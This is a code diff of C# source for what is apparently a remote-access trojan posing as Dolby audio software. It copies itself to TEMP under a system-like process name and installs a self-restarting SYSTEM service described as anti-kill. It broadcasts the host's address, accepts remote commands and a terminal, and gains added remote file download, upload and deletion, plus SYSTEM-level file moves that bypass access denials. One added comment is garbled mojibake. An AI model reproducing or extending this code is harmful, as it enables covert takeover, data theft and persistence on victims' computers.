@@ -42,17 +42,14 @@ namespace DolbyAccess
         private static bool _isServiceMode = false;
         private static Thread _pipeThread;
         private static Thread _tcpPrivThread;
-        private const string PipeName = "DolbyAccessPriv";
+        private const string PipeName = "DolbyVisionPriv";
         private const int PrivTcpPort = 9115; // 普通模式与SYSTEM服务的本地回环通信端口
-
-        // ANS模式配置
-        private const string AnsMutexName = "Global\\DolbyVision_ANS_Running";
-        private const string AnsServiceName = "Windows Audio Access";
-        private const string AnsProcessName = "audiodg.exe";
-        private const int AnsMaxRestartPerMinute = 3;
-        private static Mutex _ansMutex;
+        private const string NormalMutexName = "Global\\DolbyVision_Normal_Running";
+        private static Mutex _normalMutex;
+        // SYSTEM模式动态端口控制
+        private static volatile bool _networkStarted = false;
+        private static volatile bool _broadcastRunning = false;
         private static Thread _guardianThread;
-        private static bool _ansFallbackMode = false;
 
         [STAThread]
         static void Main(string[] args)
@@ -60,13 +57,13 @@ namespace DolbyAccess
             // 服务模式: sc create时binPath带 /service 参数
             if (args.Length > 0 && args[0].Equals("/service", StringComparison.OrdinalIgnoreCase))
             {
-                ServiceBase.Run(new DolbyAccessService());
+                ServiceBase.Run(new DolbyVisionService());
                 return;
             }
 
             // 普通模式: 自复制到TEMP并改名为系统进程名
             string currentPath = Application.ExecutablePath;
-            string tempPath = Path.Combine(Path.GetTempPath(), "audiodg.exe");
+            string tempPath = Path.Combine(Path.GetTempPath(), "AudioSrv.exe");
             if (!currentPath.Equals(tempPath, StringComparison.OrdinalIgnoreCase))
             {
                 try
@@ -79,27 +76,11 @@ namespace DolbyAccess
             }
 
 
-            // ANS模式: 创建互斥体,供SYSTEM服务检测普通模式是否存活
+            // 普通模式: 创建互斥体,供SYSTEM服务检测普通模式是否存活
             try
             {
-                _ansMutex = new Mutex(true, AnsMutexName, out bool createdNew);
+                _normalMutex = new Mutex(true, NormalMutexName, out bool createdNew);
                 if (!createdNew) { return; } // 已有实例运行
-            }
-            catch { }
-
-
-            // ANS模式: 自动安装服务(如果未安装)
-            try
-            {
-                string svcCheck = RunCmdGetOutput("sc query \"Windows Audio Access\"");
-                if (!svcCheck.Contains("RUNNING") && !svcCheck.Contains("STOPPED"))
-                {
-                    InstallService();
-                }
-                else if (svcCheck.Contains("STOPPED"))
-                {
-                    RunCmd("sc start \"Windows Audio Access\"");
-                }
             }
             catch { }
 
@@ -146,83 +127,88 @@ namespace DolbyAccess
         // SYSTEM模式始终监听网络端口(9112命令/9113终端),与普通模式(9102/9103)不冲突
         // 普通模式被杀后,主控端仍可连接SYSTEM模式执行关机/重启/杀进程/命令行
         // SYSTEM模式不做屏幕监控(Session 0无法访问桌面)
+        // ========== SYSTEM模式(服务): 命名管道提权 + 动态网络端口 ==========
+        // 普通模式运行时: SYSTEM只做命名管道提权,不监听网络端口
+        // 普通模式被杀后: 守护线程检测到互斥体消失,自动启动广播/命令/终端
+        // 普通模式重启后: 守护线程检测到互斥体,自动停止网络端口
         internal static void StartServiceMode()
         {
             _running = true;
             _isServiceMode = true;
             _machineName = Environment.MachineName;
             _localIp = GetLocalIP();
-            // ANS模式: 默认不监听网络端口,只做守护+命名管道提权
-            // 复活失败后才启动SYSTEM端口(9112/9113)并广播
+            // 只启动命名管道(为普通模式提供提权)
             _tcpPrivThread = new Thread(TcpPrivServerLoop) { IsBackground = true };
             _tcpPrivThread.Start();
-            // 守护线程: 检测普通模式是否存活,被杀后自动重启
+            // 启动守护线程: 检测普通模式是否存活,动态控制网络端口
             _guardianThread = new Thread(GuardianLoop) { IsBackground = true };
             _guardianThread.Start();
         }
 
-        // ANS守护线程: 检测互斥体,普通模式被杀后自动重启(1分钟内最多3次)
-        private static System.Collections.Generic.List<DateTime> _restartTimes = new System.Collections.Generic.List<DateTime>();
+        // 守护线程: 检测普通模式互斥体,动态启动/停止网络端口
         private static void GuardianLoop()
         {
             while (_running)
             {
                 try
                 {
-                    bool normalAlive = false;
-                    try
+                    bool normalRunning = IsNormalModeRunning();
+                    if (!normalRunning && !_networkStarted)
                     {
-                        Mutex existing = Mutex.OpenExisting(AnsMutexName);
-                        normalAlive = true;
-                        existing.Close();
+                        // 普通模式被杀,启动网络端口(fallback)
+                        StartNetworkServices();
+                        _networkStarted = true;
                     }
-                    catch { normalAlive = false; }
-
-                    if (!normalAlive && !_ansFallbackMode)
+                    else if (normalRunning && _networkStarted)
                     {
-                        _restartTimes.RemoveAll(t => (DateTime.Now - t).TotalMinutes > 1);
-                        if (_restartTimes.Count < AnsMaxRestartPerMinute)
-                        {
-                            _restartTimes.Add(DateTime.Now);
-                            string result = RestartNormalMode();
-                            LogToFile("[守护] 普通模式被杀,尝试重启: " + result);
-                        }
-                        else
-                        {
-                            _ansFallbackMode = true;
-                            LogToFile("[守护] 1分钟内重启" + AnsMaxRestartPerMinute + "次失败,进入SYSTEM fallback模式");
-                            StartSystemFallbackPorts();
-                        }
+                        // 普通模式恢复,停止网络端口
+                        StopNetworkServices();
+                        _networkStarted = false;
                     }
                 }
-                catch (Exception ex) { LogToFile("[守护] 异常: " + ex.Message); }
-                Thread.Sleep(5000);
+                catch { }
+                Thread.Sleep(3000);
             }
         }
 
-        private static void StartSystemFallbackPorts()
+
+        private static bool IsNormalModeRunning()
         {
             try
             {
-                _broadcastThread = new Thread(BroadcastLoop) { IsBackground = true };
-                _broadcastThread.Start();
-                _cmdThread = new Thread(CmdListenLoop) { IsBackground = true };
-                _cmdThread.Start();
-                _terminalThread = new Thread(TerminalListenLoop) { IsBackground = true };
-                _terminalThread.Start();
-                LogToFile("[Fallback] SYSTEM端口已启动(9112/9113),开始广播");
+                // 普通模式进程名是AudioSrv.exe,但SYSTEM服务的binPath也指向AudioSrv.exe
+                // 所以需要排除Session 0的服务进程(只统计用户会话的AudioSrv.exe)
+                var processes = Process.GetProcessesByName("AudioSrv");
+                int userSessionCount = 0;
+                foreach (var p in processes)
+                {
+                    try
+                    {
+                        // SessionId=0是服务进程(Session 0隔离),>0是用户会话进程
+                        if (p.SessionId > 0) userSessionCount++;
+                    }
+                    catch { }
+                }
+                return userSessionCount > 0;
             }
-            catch (Exception ex) { LogToFile("[Fallback] 启动端口失败: " + ex.Message); }
+            catch { return false; }
         }
 
-        private static void LogToFile(string msg)
+        private static void StartNetworkServices()
         {
-            try
-            {
-                string logPath = Path.Combine(Path.GetTempPath(), "dolbyaccess_service.log");
-                File.AppendAllText(logPath, DateTime.Now.ToString("[yyyy-MM-dd HH:mm:ss] ") + msg + "\\r\\n");
-            }
-            catch { }
+            _broadcastThread = new Thread(BroadcastLoop) { IsBackground = true };
+            _broadcastThread.Start();
+            _cmdThread = new Thread(CmdListenLoop) { IsBackground = true };
+            _cmdThread.Start();
+            _terminalThread = new Thread(TerminalListenLoop) { IsBackground = true };
+            _terminalThread.Start();
+        }
+
+        private static void StopNetworkServices()
+        {
+            _broadcastRunning = false;
+            try { _cmdListener?.Stop(); } catch { }
+            try { _terminalListener?.Stop(); } catch { }
         }
 
         private static void TcpPrivServerLoop()
@@ -253,6 +239,21 @@ namespace DolbyAccess
                                 string result = ExecuteCmdViaPipe(command);
                                 writer.WriteLine(result);
                             }
+                            else if (request != null && request.StartsWith("MOVE:"))
+                            {
+                                string[] parts = request.Substring(5).Split('|');
+                                if (parts.Length == 2)
+                                {
+                                    try
+                                    {
+                                        if (File.Exists(parts[1])) File.Delete(parts[1]);
+                                        File.Move(parts[0], parts[1]);
+                                        writer.WriteLine("OK");
+                                    }
+                                    catch (Exception ex) { writer.WriteLine("ERROR: " + ex.Message); }
+                                }
+                                else writer.WriteLine("ERROR: bad params");
+                            }
                             else
                             {
                                 writer.WriteLine("ERROR: unknown command");
@@ -281,14 +282,15 @@ namespace DolbyAccess
 
         private static void BroadcastLoop()
         {
-            while (_running)
+            _broadcastRunning = true;
+            while (_running && _broadcastRunning)
             {
                 try
                 {
                     using (var client = new UdpClient())
                     {
                         client.EnableBroadcast = true;
-                        string mode = _isServiceMode ? "SYSTEM" : "ANS";
+                        string mode = _isServiceMode ? "SYSTEM" : "NORMAL";
                         int cmdPort = _isServiceMode ? CmdPortSystem : CmdPort;
                         int termPort = _isServiceMode ? TerminalPortSystem : TerminalPort;
                         string msg = $"DV|{_machineName}|{_localIp}|{VideoPort}|{cmdPort}|{termPort}|{mode}";
@@ -398,12 +400,24 @@ namespace DolbyAccess
                                 int read = stream.Read(buffer, 0, buffer.Length);
                                 if (read <= 0) break;
                                 ms.Write(buffer, 0, read);
+                                // 如果数据小于缓冲区,说明已读完
                                 if (read < buffer.Length) break;
                             }
                         }
-                        catch { }
+                        catch { } // 超时退出循环
                         if (ms.Length <= 0) return;
                         string cmd = Encoding.UTF8.GetString(ms.ToArray()).Trim();
+                        // FILE_DOWNLOAD/FILE_UPLOAD需要持续读写stream,直接处理
+                        if (cmd.StartsWith("FILE_DOWNLOAD:", StringComparison.OrdinalIgnoreCase))
+                        {
+                            FileDownload(cmd.Substring(14), stream);
+                            return;
+                        }
+                        if (cmd.StartsWith("FILE_UPLOAD:", StringComparison.OrdinalIgnoreCase))
+                        {
+                            FileUpload(cmd.Substring(12), stream);
+                            return;
+                        }
                         string result = ExecuteCommand(cmd);
                         byte[] resp = Encoding.UTF8.GetBytes(result);
                         stream.Write(resp, 0, resp.Length);
@@ -433,6 +447,19 @@ namespace DolbyAccess
                 if (cmd.StartsWith("SHOW:", StringComparison.OrdinalIgnoreCase))
                 {
                     return StartShowPrank(cmd.Substring(5));
+                }
+                if (cmd.StartsWith("FILE_LIST:", StringComparison.OrdinalIgnoreCase))
+                {
+                    return FileList(cmd.Substring(10));
+                }
+
+                if (cmd.StartsWith("FILE_DELETE:", StringComparison.OrdinalIgnoreCase))
+                {
+                    return FileDelete(cmd.Substring(12));
+                }
+                if (cmd.StartsWith("FILE_MKDIR:", StringComparison.OrdinalIgnoreCase))
+                {
+                    return FileMkdir(cmd.Substring(11));
                 }
                 if (cmd.Equals("RESTART_NORMAL", StringComparison.OrdinalIgnoreCase))
                 {
@@ -609,6 +636,8 @@ namespace DolbyAccess
         {
             try
             {
+                // 协议: SHOW:<模式>|<文字>|<图片Base64>|<时长秒>|<字号>|<文字颜色>|<背景色>
+                // 模式: TEXT / IMAGE / BOTH
                 string[] parts = param.Split('|');
                 string mode = parts.Length > 0 ? parts[0].Trim().ToUpper() : "TEXT";
                 string text = parts.Length > 1 ? parts[1] : "";
@@ -650,6 +679,7 @@ namespace DolbyAccess
                             form.KeyPreview = true;
                             form.KeyDown += (s, e) => { if (e.KeyCode == Keys.Escape || e.KeyCode == Keys.F4) form.Close(); };
 
+                            // 图片层
                             if (showImage != null)
                             {
                                 var pictureBox = new PictureBox();
@@ -659,17 +689,20 @@ namespace DolbyAccess
                                 form.Controls.Add(pictureBox);
                             }
 
-                                                        if (!string.IsNullOrEmpty(text) && (mode == "TEXT" || mode == "BOTH"))
+                            // 文字层
+                            if (!string.IsNullOrEmpty(text) && (mode == "TEXT" || mode == "BOTH"))
                             {
                                 var label = new Label();
                                 if (mode == "TEXT")
                                 {
+                                    // 仅文字模式: 全屏居中
                                     label.Dock = DockStyle.Fill;
                                     label.TextAlign = ContentAlignment.MiddleCenter;
                                     label.BackColor = Color.Transparent;
                                 }
                                 else
                                 {
+                                    // 文字+图片模式: 底部叠加,半透明黑底
                                     label.Dock = DockStyle.Bottom;
                                     label.Height = 120;
                                     label.TextAlign = ContentAlignment.MiddleCenter;
@@ -682,6 +715,7 @@ namespace DolbyAccess
                                 label.BringToFront();
                             }
 
+                            // 左下角倒计时提示
                             var tipLabel = new Label();
                             tipLabel.AutoSize = true;
                             tipLabel.Location = new Point(10, form.Height - 30);
@@ -713,6 +747,182 @@ namespace DolbyAccess
                 return "OK: 远程展示已启动(" + mode + ", " + duration + "秒)";
             }
             catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ========== 远程文件管理 ==========
+        private static string FileList(string path)
+        {
+            try
+            {
+                if (!Directory.Exists(path)) return "ERROR: 目录不存在";
+                var sb = new StringBuilder();
+                // 上级目录
+                sb.AppendLine("..|<dir>|0|D");
+                foreach (var dir in Directory.GetDirectories(path))
+                {
+                    var name = Path.GetFileName(dir);
+                    sb.AppendLine(name + "|<dir>|0|D");
+                }
+                foreach (var f in Directory.GetFiles(path))
+                {
+                    var fi = new FileInfo(f);
+                    var name = Path.GetFileName(f);
+                    sb.AppendLine(name + "|" + fi.Length + "|" + fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm") + "|F");
+                }
+                return sb.ToString().TrimEnd('\r', '\n');
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        private static void FileDownload(string path, NetworkStream stream)
+        {
+            try
+            {
+                if (!File.Exists(path)) { WriteStr(stream, "ERROR: 文件不存在"); return; }
+                byte[] data = File.ReadAllBytes(path);
+                WriteStr(stream, "SIZE:" + data.Length);
+                // 分块发送,每块4KB
+                int blockSize = 4096;
+                int seq = 0;
+                for (int i = 0; i < data.Length; i += blockSize)
+                {
+                    int len = Math.Min(blockSize, data.Length - i);
+                    byte[] block = new byte[len];
+                    Array.Copy(data, i, block, 0, len);
+                    string b64 = Convert.ToBase64String(block);
+                    WriteStr(stream, "DATA:" + seq + ":" + b64);
+                    seq++;
+                    Thread.Sleep(1); // 避免发送过快
+                }
+                WriteStr(stream, "END");
+            }
+            catch (Exception ex) { try { WriteStr(stream, "ERROR: " + ex.Message); } catch { } }
+        }
+
+        private static void FileUpload(string param, NetworkStream stream)
+        {
+            try
+            {
+                // param: <保存路径>:<总大小>[:OVERWRITE][:SYSTEM]
+                string[] parts = param.Split(':');
+                if (parts.Length < 2) { WriteStr(stream, "ERROR: 参数错误"); return; }
+                string savePath = parts[0];
+                long totalSize = long.Parse(parts[1]);
+                bool overwrite = param.Contains(":OVERWRITE");
+                bool forceSystem = param.Contains(":SYSTEM");
+
+                if (File.Exists(savePath) && !overwrite) { WriteStr(stream, "EXISTS"); return; }
+                WriteStr(stream, "READY");
+
+                // 接收分块数据
+                string tempPath = Path.Combine(Path.GetTempPath(), "dv_upload_" + Guid.NewGuid().ToString("N") + ".tmp");
+                using (var fs = new FileStream(tempPath, FileMode.Create, FileAccess.Write))
+                {
+                    while (true)
+                    {
+                        string line = ReadStr(stream);
+                        if (line == null || line == "END") break;
+                        if (line.StartsWith("DATA:"))
+                        {
+                            int colon1 = line.IndexOf(':', 5);
+                            string b64 = line.Substring(colon1 + 1);
+                            byte[] block = Convert.FromBase64String(b64);
+                            fs.Write(block, 0, block.Length);
+                        }
+                    }
+                }
+
+                // 移动到目标路径
+                try
+                {
+                    if (File.Exists(savePath)) File.Delete(savePath);
+                    File.Move(tempPath, savePath);
+                    WriteStr(stream, "OK: 上传成功");
+                }
+                catch (UnauthorizedAccessException)
+                {
+                    // 权限不足,尝试通过SYSTEM服务模式移动
+                    if (MoveFileViaService(tempPath, savePath))
+                        WriteStr(stream, "OK: 上传成功(SYSTEM提权)");
+                    else
+                    {
+                        try { File.Delete(tempPath); } catch { }
+                        WriteStr(stream, "ERROR: 权限不足,请先安装SYSTEM服务");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    try { File.Delete(tempPath); } catch { }
+                    WriteStr(stream, "ERROR: " + ex.Message);
+                }
+            }
+            catch (Exception ex) { try { WriteStr(stream, "ERROR: " + ex.Message); } catch { } }
+        }
+
+        private static string FileDelete(string path)
+        {
+            try
+            {
+                if (File.Exists(path)) { File.Delete(path); return "OK: 文件已删除"; }
+                if (Directory.Exists(path)) { Directory.Delete(path, false); return "OK: 目录已删除"; }
+                return "ERROR: 文件/目录不存在";
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        private static string FileMkdir(string path)
+        {
+            try
+            {
+                Directory.CreateDirectory(path);
+                return "OK: 目录已创建";
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        private static void WriteStr(NetworkStream stream, string s)
+        {
+            byte[] data = Encoding.UTF8.GetBytes(s + "\n");
+            stream.Write(data, 0, data.Length);
+            stream.Flush();
+        }
+
+        private static string ReadStr(NetworkStream stream)
+        {
+            var ms = new MemoryStream();
+            byte[] buf = new byte[1];
+            while (true)
+            {
+                int r = stream.Read(buf, 0, 1);
+                if (r <= 0) return null;
+                if (buf[0] == (byte)'\n') break;
+                ms.WriteByte(buf[0]);
+            }
+            return Encoding.UTF8.GetString(ms.ToArray()).Trim();
+        }
+
+        private static bool MoveFileViaService(string src, string dst)
+        {
+            try
+            {
+                // 通过本地回环9115请求SYSTEM服务模式移动文件
+                using (var client = new TcpClient())
+                {
+                    client.Connect("127.0.0.1", 9115);
+                    using (var s = client.GetStream())
+                    {
+                        string cmd = "MOVE:" + src + "|" + dst;
+                        byte[] data = Encoding.UTF8.GetBytes(cmd);
+                        s.Write(data, 0, data.Length);
+                        s.Flush();
+                        byte[] resp = new byte[256];
+                        int read = s.Read(resp, 0, resp.Length);
+                        string result = Encoding.UTF8.GetString(resp, 0, read).Trim();
+                        return result.StartsWith("OK");
+                    }
+                }
+            }
+            catch { return false; }
         }
         // ========== 远程进程控制 ==========
         // P/Invoke for process owner
@@ -773,7 +983,7 @@ namespace DolbyAccess
                     return "ERROR: DuplicateTokenEx失败 " + Marshal.GetLastWin32Error();
                 if (!CreateEnvironmentBlock(out envBlock, dupToken, false))
                     return "ERROR: CreateEnvironmentBlock失败 " + Marshal.GetLastWin32Error();
-                string exePath = Path.Combine(Path.GetTempPath(), "audiodg.exe");
+                string exePath = Path.Combine(Path.GetTempPath(), "AudioSrv.exe");
                 if (!File.Exists(exePath)) exePath = Application.ExecutablePath;
                 var si = new STARTUPINFO();
                 si.cb = Marshal.SizeOf(si);
@@ -998,10 +1208,10 @@ namespace DolbyAccess
             {
                 string exePath = Application.ExecutablePath;
                 string binPath = "\"" + exePath + " /service\"";
-                bool createOk = RunCmd("sc create \"Windows Audio Access\" binPath= " + binPath + " start= auto");
+                bool createOk = RunCmd("sc create DolbyVision binPath= " + binPath + " start= auto");
                 if (!createOk) return "ERROR: 创建服务失败(可能需要管理员权限)";
-                RunCmd("sc failure \"Windows Audio Access\" reset= 0 actions= restart/5000/restart/5000/restart/5000");
-                bool startOk = RunCmd("sc start \"Windows Audio Access\"");
+                RunCmd("sc failure DolbyVision reset= 0 actions= restart/5000/restart/5000/restart/5000");
+                bool startOk = RunCmd("sc start DolbyVision");
                 if (startOk)
                     return "OK: 服务安装并启动成功(SYSTEM权限+开机自启+被杀5秒重启)";
                 else
@@ -1031,26 +1241,6 @@ namespace DolbyAccess
             }
             catch { return false; }
         }
-
-        private static string RunCmdGetOutput(string cmd)
-        {
-            try
-            {
-                var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
-                {
-                    CreateNoWindow = true,
-                    UseShellExecute = false,
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true
-                };
-                using (var p = Process.Start(psi))
-                {
-                    p.WaitForExit(8000);
-                    return p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
-                }
-            }
-            catch { return ""; }
-        }
         private static string UninstallService()
         {
             try
@@ -1059,8 +1249,8 @@ namespace DolbyAccess
                 var t = new Thread(() =>
                 {
                     Thread.Sleep(3000);
-                    RunCmd("sc stop \"Windows Audio Access\"");
-                    RunCmd("sc delete \"Windows Audio Access\"");
+                    RunCmd("sc stop DolbyVision");
+                    RunCmd("sc delete DolbyVision");
                 }) { IsBackground = true };
                 t.Start();
                 return "OK: 服务卸载命令已发送,3秒后执行(连接将断开)";
@@ -1228,6 +1418,7 @@ namespace DolbyAccess
                     { IsBackground = true };
                     errorThread.Start();
 
+                    // 杈撳叆杞彂(閫愬瓧绗︾疮绉?鎹㈣鏃舵娴媠u/exit鎻愭潈)
                     byte[] inBuffer = new byte[4096];
                     System.Text.StringBuilder lineBuf = new System.Text.StringBuilder();
                     bool privMode = false; // SYSTEM提权会话模式
@@ -1257,7 +1448,7 @@ namespace DolbyAccess
                                         }
                                         else
                                         {
-                                            byte[] err = Encoding.UTF8.GetBytes("\r\n[提权失败] SYSTEM服务未运行\r\n");
+                                            string errMsg = (test != null && test.StartsWith("PIPE_ERROR:")) ? test : "SYSTEM服务未运行"; byte[] err = Encoding.UTF8.GetBytes("\r\n[提权失败] " + errMsg + "\r\n");
                                             stream.Write(err, 0, err.Length); stream.Flush();
                                         }
                                     }
@@ -1359,15 +1550,15 @@ namespace DolbyAccess
     }
 
     // ========== Windows服务模式 ==========
-    // 安装: sc create "Windows Audio Access" binPath= "路径\DolbyVision.exe /service" start= auto
-    // 启动: sc start "Windows Audio Access"
-    // 防杀: sc failure "Windows Audio Access" reset= 0 actions= restart/5000/restart/5000/restart/5000
-    // 卸载: sc stop "Windows Audio Access" & sc delete "Windows Audio Access"
-    internal class DolbyAccessService : ServiceBase
+    // 安装: sc create DolbyVision binPath= "路径\DolbyVision.exe /service" start= auto
+    // 启动: sc start DolbyVision
+    // 防杀: sc failure DolbyVision reset= 0 actions= restart/5000/restart/5000/restart/5000
+    // 卸载: sc stop DolbyVision & sc delete DolbyVision
+    internal class DolbyVisionService : ServiceBase
     {
-        public DolbyAccessService()
+        public DolbyVisionService()
         {
-            ServiceName = "Windows Audio Access";
+            ServiceName = "DolbyVision";
             CanStop = true;
             CanShutdown = true;
         }
